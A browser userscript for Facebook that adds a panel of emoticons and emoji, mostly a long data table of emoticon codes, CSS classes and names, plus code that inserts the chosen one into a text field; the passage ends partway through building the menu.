﻿	// ==UserScript==
// @name            New Emoticons Facebook IOS 7 Style!
// @description     All about facebook 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
